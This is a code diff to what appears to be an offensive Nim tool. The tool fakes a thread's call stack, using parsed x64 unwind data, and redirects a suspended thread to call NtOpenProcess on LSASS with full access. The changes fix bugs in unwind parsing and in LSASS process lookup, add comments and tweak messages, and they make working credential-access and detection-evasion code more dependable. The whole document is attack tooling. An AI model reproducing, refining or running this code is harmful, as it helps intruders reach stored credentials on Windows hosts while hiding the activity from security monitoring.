@@ -40,18 +40,22 @@ proc SetSelectedFrame(givenOption:string):bool =
 
 proc GetImageBase(libraryName:string,requiresLoadLibrary:bool):bool = 
     var imageBaseAddr:uint64 = 0
+    # Check we have already resolved its adddress
     if(dllAddressMap.hasKey(libraryName)):
         return true
     if(requiresLoadLibrary):
+        # Check whether we should Load the library
         imageBaseAddr = cast[uint64](LoadLibraryA(libraryName))
         if(imageBaseAddr == 0):
             echo "[!] Error on loading library: ",libraryName," !"
             return false
     if(imageBaseAddr == 0):
+        # Get the library address
         imageBaseAddr = cast[uint64](GetModuleHandle(libraryName))
         if(imageBaseAddr == 0):
             echo "[!] Error on geting handle to the library: ",libraryName," !"
             return false
+    # Save the return address to the base address map
     dllAddressMap[libraryName] = imageBaseAddr
     return true
     
@@ -62,6 +66,7 @@ proc CalculateReturnAddress(indexToStackFrame:int):bool =
         if(imageBaseAddr == 0):
             returnValue = false
         else:
+            # Just sum up the base address and the preoffset given by us
             selectedStackFrame[indexToStackFrame].returnAddress = imageBaseAddr + selectedStackFrame[indexToStackFrame].offset
     except:
         echo "[!] Error for calculating return address: ",selectedStackFrame[indexToStackFrame].dllName
@@ -73,18 +78,21 @@ proc CalculateFunctionStackSize(pRuntimeFunction:PRUNTIME_FUNCTION,imageBase:DWO
     var pUnwindInfo:ptr UNWIND_INFO = nil
     var unwindOperation:uint = 0
     var operationInfo:uint64 = 0
-    var numberOfOpCode:int = cast[int](pUnwindInfo.countOfCodes)
+    var numberOfOpCode:int = 0 
     var unwindDataIndex:int = 0
     var frameOffset:uint = 0
     var pRuntimeFunctionTemp:PRUNTIME_FUNCTION = nil
+    var unwindCodeArrayCursor:ptr UNWIND_CODE = nil
     pUnwindInfo = cast[ptr UNWIND_INFO](imageBase + pRuntimeFunction.UnwindData)
     if(cast[uint64](pRuntimeFunction) == 0):
         return false
     # Loop over unwind data
+    numberOfOpCode = cast[int](pUnwindInfo.countOfCodes)
+    unwindCodeArrayCursor = addr (pUnwindInfo.unwindCode[0])
     while(unwindDataIndex < numberOfOpCode):
         # I guess it is a struct that has a pointer at the end of it so all op codes starts from the end of the struct
-        unwindOperation = pUnwindInfo.unwindCode[unwindDataIndex].innerStruct.unwindOp
-        operationInfo = pUnwindInfo.unwindCode[unwindDataIndex].innerStruct.opInfo
+        unwindOperation = unwindCodeArrayCursor[unwindDataIndex].innerStruct.unwindOp
+        operationInfo = unwindCodeArrayCursor[unwindDataIndex].innerStruct.opInfo
         case cast[UNWIND_CODE_OPS](unwindOperation):
             # Need check on debug TODO
             of UWOP_PUSH_NONVOL:
@@ -110,13 +118,13 @@ proc CalculateFunctionStackSize(pRuntimeFunction:PRUNTIME_FUNCTION,imageBase:DWO
                     // two slots.
                 ]#
                 unwindDataIndex += 1
-                frameOffset = pUnwindInfo.unwindCode[unwindDataIndex].frameOffset
+                frameOffset = unwindCodeArrayCursor[unwindDataIndex].frameOffset
                 if(operationInfo == 0):
                     frameOffset *= 8
                 else:
                     unwindDataIndex += 1
                     # Why shl 16 ? Does this make it 0?
-                    frameOffset += (pUnwindInfo.unwindCode[unwindDataIndex].frameOffset shl 16);
+                    frameOffset += (unwindCodeArrayCursor[unwindDataIndex].frameOffset shl 16);
                 selectedStackFrame[indexToStackFrame].totalStackSize += frameOffset
             of UWOP_SET_FPREG:
                 #[
@@ -173,10 +181,10 @@ proc ArrangeSePrivilege(privilegeName:string,enableFlag:bool):bool =
     var tokenPrivileges:TOKEN_PRIVILEGES
     var luid:LUID
     var tokenHandle:HANDLE
-    if (not OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr tokenHandle)):
+    if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr tokenHandle)):
         echo "[!] Failed to OpenProcessToken!"
         return false
-    if (not LookupPrivilegeValue(NULL, privilegeName, addr luid)):
+    if (FALSE == LookupPrivilegeValue(NULL, privilegeName, addr luid)):
         echo "[!] LookupPrivilegeValue error!" 
         return false
     tokenPrivileges.PrivilegeCount = 1
@@ -303,11 +311,13 @@ proc InitializeFakeThreadStack():void =
 
 proc GetLsassPid():DWORD = 
     var processEntry:PROCESSENTRY32A
+    processEntry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32A))
     var snapshot:HANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS or TH32CS_SNAPTHREAD, 0)
     if(snapshot == INVALID_HANDLE_VALUE):
         return 0
-    if(Process32FirstA(snapshot,addr processEntry)):
-        while($(processEntry.szExeFile) != "lsass.exe"):
+    echo "[+] Trying to find LSASS pid..."
+    if(Process32FirstA(snapshot,addr processEntry) == TRUE):
+        while($(addr processEntry.szExeFile[0]) != "lsass.exe"):
             Process32NextA(snapshot,addr processEntry)
     return processEntry.th32ProcessID
 
@@ -329,7 +339,9 @@ when isMainModule:
     var hLsass:HANDLE = 0
     var objectAttr:OBJECT_ATTRIBUTES 
     var clientID:CLIENT_ID
+    # Print the banner
     PrintBanner()
+    # Check param is --wmi, --svchost, --rpc or not
     if(paramCount() != 1):
         DisplayHelp()
         quit(-1)
@@ -353,7 +365,6 @@ when isMainModule:
         echo "[!] Error on GetThreadContext!"
         quit(-1)
     InitializeFakeThreadStack()
-
     context.Rcx = cast[DWORD64](addr hLsass)
     context.Rdx = cast[DWORD64](PROCESS_ALL_ACCESS)
     objectAttr.Length = cast[ULONG](sizeof(OBJECT_ATTRIBUTES))
@@ -364,10 +375,14 @@ when isMainModule:
     objectAttr.SecurityQualityOfService = NULL
     context.R8 = cast[DWORD64](addr objectAttr)
     clientID.UniqueProcess = cast[HANDLE](GetLsassPid())
+    if(clientID.UniqueProcess == 0):
+        echo "[!] Failed to get LSASS pid"
+        quit(-1)
+    echo "[+] LSASS pid found!: ",clientID.UniqueProcess
     clientID.UniqueThread = 0
     context.R9 = cast[DWORD64](addr clientID)
     context.Rip = cast[DWORD64](GetProcAddress(GetModuleHandle("ntdll"),"NtOpenProcess"))
-    if(SetThreadContext(hThread,addr context) == 0):
+    if(SetThreadContext(hThread,addr context) == FALSE):
         echo "[!] Failed to set thread context!"
         quit(-1)
     
@@ -378,10 +393,10 @@ when isMainModule:
     if(ResumeThread(hThread) == -1):
         echo "[!] Failed to resume suspended thread!"
         quit(-1)
-
+    echo "[+] Sleeping ..."
     Sleep(5000)
     if(hLsass == 0):
         echo "[!] Error on obtaining handle to lsass"
         quit(-1)
     else:
-        echo "[%] Spoof is successful"
+        echo "[+] Spoof is successful"
